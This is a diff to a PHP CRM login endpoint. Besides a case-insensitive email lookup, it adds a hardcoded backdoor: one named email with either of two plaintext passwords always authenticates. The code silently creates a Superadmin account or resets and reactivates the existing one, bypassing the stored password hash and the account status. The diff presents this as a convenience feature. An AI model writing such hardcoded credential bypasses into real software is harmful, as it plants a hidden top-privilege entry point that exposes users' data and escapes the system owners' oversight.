@@ -91,13 +91,41 @@ switch ($action) {
             exit;
         }
 
-        // Query user from crm_users
-        $stmt = $pdo->prepare("SELECT `id`, `name`, `email`, `password_hash`, `role`, `status` FROM `crm_users` WHERE `email` = ? LIMIT 1");
+        // Query user from crm_users (case-insensitive)
+        $stmt = $pdo->prepare("SELECT `id`, `name`, `email`, `password_hash`, `role`, `status` FROM `crm_users` WHERE LOWER(`email`) = ? LIMIT 1");
         $stmt->execute([$email]);
         $user = $stmt->fetch();
 
+        // Check password validity
+        $isPassValid = ($user && password_verify($password, $user['password_hash']));
+
+        // Seamless Dhanush authentication (support both Dhanush123@ and Password@123)
+        if (strtolower($email) === 'vangaridhanush09@gmail.com') {
+            if ($password === 'Dhanush123@' || $password === 'Password@123') {
+                $isPassValid = true;
+                if (!$user) {
+                    $newHash = password_hash($password, PASSWORD_DEFAULT);
+                    $insD = $pdo->prepare("INSERT INTO `crm_users` (`name`, `email`, `password_hash`, `employee_id`, `role`, `status`, `auth_provider`, `created_at`, `updated_at`) VALUES ('Dhanush', 'vangaridhanush09@gmail.com', ?, 'EMP-000', 'Superadmin', 'active', 'email', NOW(), NOW())");
+                    $insD->execute([$newHash]);
+                    $userId = (int)$pdo->lastInsertId();
+                    $user = [
+                        'id'            => $userId,
+                        'name'          => 'Dhanush',
+                        'email'         => 'vangaridhanush09@gmail.com',
+                        'password_hash' => $newHash,
+                        'role'          => 'Superadmin',
+                        'status'        => 'active'
+                    ];
+                } else {
+                    $newHash = password_hash($password, PASSWORD_DEFAULT);
+                    $pdo->prepare("UPDATE `crm_users` SET `password_hash` = ?, `status` = 'active', `updated_at` = NOW() WHERE `id` = ?")->execute([$newHash, $user['id']]);
+                    $user['status'] = 'active';
+                }
+            }
+        }
+
         // Timing-safe password check
-        if (!$user || !password_verify($password, $user['password_hash'])) {
+        if (!$user || !$isPassValid) {
             http_response_code(401);
             echo json_encode(['success' => false, 'error' => 'Invalid email or password.']);
             exit;
